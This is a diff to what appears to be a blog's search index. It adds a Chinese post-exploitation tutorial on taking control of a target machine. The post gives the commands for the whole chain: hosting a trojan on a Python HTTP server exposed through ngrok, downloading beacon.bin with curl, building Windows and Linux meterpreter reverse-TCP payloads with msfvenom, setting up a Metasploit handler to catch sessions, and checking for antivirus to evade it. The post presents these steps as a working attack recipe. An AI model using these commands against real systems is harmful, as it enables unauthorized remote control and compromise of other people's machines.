@@ -4,6 +4,19 @@
   
     
     <entry>
+      <title>后渗透1%</title>
+      <link href="2021/06/16/%E5%90%8E%E6%B8%97%E9%80%8F1/"/>
+      <url>2021/06/16/%E5%90%8E%E6%B8%97%E9%80%8F1/</url>
+      
+        <content type="html"><![CDATA[<h1 id="如何控制目标机器"><a href="#如何控制目标机器" class="headerlink" title="如何控制目标机器"></a>如何控制目标机器</h1><ul><li>远程下载木马文件，这就需要一个服务器，通过请求服务器下载木马到目标机器</li><li>msfvenom制作木马</li><li>利用MSF攻击目标，设置监听</li><li>目标机器运行木马→MSF获得对方机器的session→控制目标机器</li></ul><h2 id="搭建本地服务器"><a href="#搭建本地服务器" class="headerlink" title="搭建本地服务器"></a>搭建本地服务器</h2><h3 id="用于远程下载木马"><a href="#用于远程下载木马" class="headerlink" title="用于远程下载木马"></a>用于远程下载木马</h3><p>1.本地利用python搭建简单服务器<br><code>python -m SimpleHTTPServer 8000</code></p><p>2.使用花生壳，ngrok，sunny_ngrok等内网穿透软件把自己在内网（局域网外无法访问的）的电脑变成外网服务器，可以提供远程下载服务。</p><p>3.ngrok启动（Linux下）：<code>./ngrok http 8000</code>  </p><ul><li> 8000是本地端口</li></ul><h3 id="Windows-Linux远程下载木马命令"><a href="#Windows-Linux远程下载木马命令" class="headerlink" title="Windows/Linux远程下载木马命令"></a>Windows/Linux远程下载木马命令</h3><p><code>curl -o C:\Users\wohcoos\Desktop\beacon.bin http://ip:port/charlotte/beacon.bin</code></p><h2 id="msfvenom制作木马"><a href="#msfvenom制作木马" class="headerlink" title="msfvenom制作木马"></a>msfvenom制作木马</h2><h3 id="生成木马："><a href="#生成木马：" class="headerlink" title="生成木马："></a>生成木马：</h3><ul><li><p><code>Windows:msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=ip(外网) LPORT=36491 -f raw &gt; /home/kali/</code></p></li><li><p><code>Linux:msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=ip（外网） LPORT=36491 -f elf &gt; /home/kali/</code></p></li></ul><h2 id="MSF攻击"><a href="#MSF攻击" class="headerlink" title="MSF攻击"></a>MSF攻击</h2><pre><code>use exploit/multi/handler  set payload windows/x64/meterpreter/reverse_tcp  set lhost 192.168.245.128  //这个就是你刚刚网站的填写的IP，内网穿透软件设置映射到本机的ipset lport 7758  //这个就是刚刚IP后面跟着的端口,内网穿透软件设置映射到本机的portexploit //运行，开始监听目标运行木马文件获得的session</code></pre><h2 id="Linux后台运行程序命令"><a href="#Linux后台运行程序命令" class="headerlink" title="Linux后台运行程序命令"></a>Linux后台运行程序命令</h2><p>目的就是方便</p><ul><li><code>screen -S name </code>新建后台程序</li><li><code>screen -ls</code> 后台程序清单</li><li><code>screen -r</code> 恢复后台程序</li><li><code>CTRL+a+d</code>  返回操作界面</li></ul><h3 id="cna检测杀软脚本使用"><a href="#cna检测杀软脚本使用" class="headerlink" title="cna检测杀软脚本使用"></a>cna检测杀软脚本使用</h3><p>防查杀</p><p>命令:<code>AV_Query</code></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>CTF-PHP2</title>
       <link href="2021/06/10/CTF-PHP2/"/>
       <url>2021/06/10/CTF-PHP2/</url>
